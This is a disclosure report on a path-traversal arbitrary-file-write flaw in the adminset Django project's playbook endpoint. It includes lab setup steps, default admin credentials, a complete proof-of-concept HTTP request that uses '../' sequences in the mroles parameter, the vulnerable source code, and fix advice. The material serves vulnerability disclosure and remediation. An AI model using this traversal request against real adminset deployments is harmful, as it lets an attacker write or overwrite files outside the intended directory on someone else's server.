### Vulnerability details

**Official website / Product:** https://github.com/guohongze/adminset

**Repository:** guohongze/adminset (stars at selection: 3456)

**Vulnerability type:** file_upload (path traversal arbitrary write)

**Vulnerability versions:** commit `6c122c2824e6553b09ebd16a1fa05a593198c5ec` (current default-branch HEAD; README claims Django 4.2.20 / Python 3.12)

**Vulnerability URL / Parameter:** `POST /setup/playbook/` parameters `mroles` + `mvars` (also needs a non-empty `mserver` to enter the `ansible_task` host+roles branch); routed via `setup/urls.py` → `path('playbook/', ansible.playbook)` under the `/setup/` mount.

**Complex:** yes

### Verification procedure

1. **Lab topology** (original `labs/adminset-r67-a3/` and image `adminset-r67a3:lab` were removed after audit — rebuild an equivalent stack from the same commit):
   - Source: `repos/adminset` @ `6c122c2824e6553b09ebd16a1fa05a593198c5ec`;
   - Stack: `python:3.12-slim-bookworm` web + `redis:7-alpine`, SQLite; host port **24703** → container **8000**;
   - Containers: `adminset-r67a3-web` (Redis: `adminset-r67a3-redis`);
   - Default `adminset.conf` has `roles_path = /var/opt/adminset/data/ansible/roles/` (`get_dir("r_path")` → module-level `roles_dir`);
   - Lab entrypoint applies a Py3 text-mode compat shim for legacy `wb+`/`ab+` writers (upstream passes `str` to binary handles); **the vulnerability sink itself is unchanged upstream code**;
   - Creds: superuser `admin` / `admin` (`permission_verify` allows `is_superuser` unconditionally).

   Measured ready state (`docker compose ps` equivalent):

   ```text
   NAME                   IMAGE                COMMAND                  SERVICE   STATUS         PORTS
   adminset-r67a3-redis   redis:7-alpine       "docker-entrypoint.s…"   redis     Up             6379/tcp
   adminset-r67a3-web     adminset-r67a3:lab   "bash /lab/conf/entr…"   web       Up             0.0.0.0:24703->8000/tcp, [::]:24703->8000/tcp
   ```

   Minimal compose skeleton (aligned with measured names/ports/image tag; Web image must be built from the same commit and include the Py3 text-mode compat noted above):

   ```yaml
   services:
     redis:
       image: redis:7-alpine
       container_name: adminset-r67a3-redis
     web:
       image: adminset-r67a3:lab
       container_name: adminset-r67a3-web
       ports:
         - "24703:8000"
       depends_on:
         - redis
   ```

2. Obtain a session: `GET /accounts/login/` for the `csrftoken` cookie; then `POST /accounts/login/` with `username=admin`, `password=admin`, `csrfmiddlewaretoken=<token>`, `next=/` to receive `sessionid`. PoC Cookie values below were captured in the lab — refresh them for a new session; the POST body `csrfmiddlewaretoken` must match the `csrftoken` cookie.
3. **Escape target parent directory must already exist:** `write_role_vars` only `os.mkdir(.../vars)` (one level), not `makedirs`. Before the PoC:
   ```bash
   docker exec adminset-r67a3-web mkdir -p /tmp/adminset_role_escape
   ```
4. `POST /setup/playbook/` (authenticated Cookie + CSRF) with:
   - `mserver=localhost` (any non-empty value to hit the host branch);
   - `mroles=../../../../../../tmp/adminset_role_escape` (six `../` segments relative to `roles_path` escape into `/tmp/adminset_role_escape`);
   - `mvars=r67a3_marker: injected` (attacker YAML text).
5. `write_role_vars` runs **before** `ansible-playbook`, writing to `roles_dir + mroles + '/vars/main.yml'` with no `realpath` containment and no `get_roles()` allowlist. The subsequent playbook may fail on the bogus role name; that does not undo the write. The view still returns `ok`.
6. Confirm the write inside the container:
   ```bash
   docker exec adminset-r67a3-web cat /tmp/adminset_role_escape/vars/main.yml
   ```
   Expected output:

   ```text
   ---
   r67a3_marker: injected
   ```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /setup/playbook/ HTTP/1.1
Host: 127.0.0.1:24703
User-Agent: adminset-r67-a3-poc/1.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: http://127.0.0.1:24703
Referer: http://127.0.0.1:24703/setup/ansible/
Cookie: sessionid=mx6grmpm48iab4ipcdvixwx548z00bvl; csrftoken=93HUgOUoEPhStGHu8hO0BDMXENQQgc7t
Content-Length: 165
Connection: close

csrfmiddlewaretoken=93HUgOUoEPhStGHu8hO0BDMXENQQgc7t&mserver=localhost&mroles=..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fadminset_role_escape&mvars=r67a3_marker%3A+injected
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 18:13:48 GMT
Server: WSGIServer/0.2 CPython/3.12.16
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

ok
```

Verification result notes:

HTTP 200 / body `ok`. File `/tmp/adminset_role_escape/vars/main.yml` contains:

```text
---
r67a3_marker: injected
```

Path escaped configured `roles_path=/var/opt/adminset/data/ansible/roles/` (six `../` → filesystem root, then `/tmp/adminset_role_escape/vars/main.yml`). Filename is fixed to `vars/main.yml`, but the directory is fully attacker-controlled via `mroles`.

### Vulnerability analysis

`write_role_vars` (`setup/ansible.py`) concatenates each POST `mroles` value onto `roles_dir`, creates `vars/`, and writes `main.yml` without `realpath` containment or an allowlist from `get_roles(roles_dir)`. The UI lists existing roles, but the server trusts the client-supplied role name.

Call chain: `playbook` view (`@login_required` + `@permission_verify`) → `ansible_task(..., write_role_vars)` (`setup/tasks.py`) → under `if host:` / `if roles:` / `if role_vars:` calls `write_role_vars(roles, role_vars)` **before** generating `gexec.yml` and running `ansible-playbook`. A non-empty `mserver` plus traversal `mroles` plus any `mvars` is enough to trigger the write; playbook success is irrelevant.

Impact: authenticated admin (lab default `admin`) → arbitrary `…/vars/main.yml` creation outside `roles_path` as the app user (can overwrite an existing target). The fixed `vars/main.yml` suffix limits free-form filenames but is still path-traversal arbitrary-directory write.

Trigger / sink source (full path and line numbers):

```python
# File: setup/ansible.py
# Lines: 17, 23-39 (upstream HEAD 6c122c2)
roles_dir = get_dir("r_path")  # adminset.conf → /var/opt/adminset/data/ansible/roles/

def write_role_vars(roles, vargs):

    r_vars = vargs.split('\r\n')
    for r in roles:

        if vargs:
            if os.path.exists(roles_dir+r+"/vars"):
                pass
            else:
                os.mkdir(roles_dir+r+"/vars")

            with open(roles_dir+r+'/vars/main.yml', 'wb+') as role_file:
                role_file.writelines("---\n")
                for x in r_vars:
                    rs = x + '\n'
                    role_file.writelines(rs)
    return True
```

```python
# File: setup/ansible.py
# Lines: 52-71 (playbook view reads POST and calls ansible_task)
@login_required()
@permission_verify()
def playbook(request):
    if os.path.exists(ansible_dir + '/gexec.yml'):
        os.remove(ansible_dir + '/gexec.yml')
    if os.path.exists(log_path + "/execlog/ansible_{0}.log".format(request.user.username)):
        os.remove(log_path + "/execlog/ansible_{0}.log".format(request.user.username))
    else:
        pass
    if request.method == 'POST':
        host = request.POST.getlist('mserver', [])
        group = request.POST.getlist('mgroup', [])
        pbook = request.POST.getlist('splaybook', [])
        roles = request.POST.getlist('mroles', [])
        role_vars = request.POST.get('mvars')
        res = GetRedis.connect()
        res.set("ansible_{0}".format(request.user.username), 1)
        ansible_task(request, host, group, pbook, roles, role_vars, write_role_vars)

    return HttpResponse("ok")
```

```python
# File: setup/tasks.py
# Lines: 36-47 (host+roles branch writes role vars before running playbook)
@shared_task
def ansible_task(request, host, group, pbook, roles, role_vars, write_role_vars):
    ret = []
    res = GetRedis.connect()
    logging.info("==========ansible tasks start==========\n")
    logging.info("User:"+request.user.username)
    with open(log_path + "/ansible.log", 'wb+') as f:
        f.writelines("==========ansible tasks start==========\n")
    if host:
        if roles:
            if role_vars:
                write_role_vars(roles, role_vars)
            for h in host:
                # ... build gexec.yml and ansible-playbook ...
```

### Fix notes

1. Allow only role names returned by `get_roles(roles_dir)`; reject `..`, `/`, and absolute paths.  
2. After join, `os.path.realpath` and ensure the result stays under `roles_dir`.  
3. Do not build filesystem paths from raw user input.
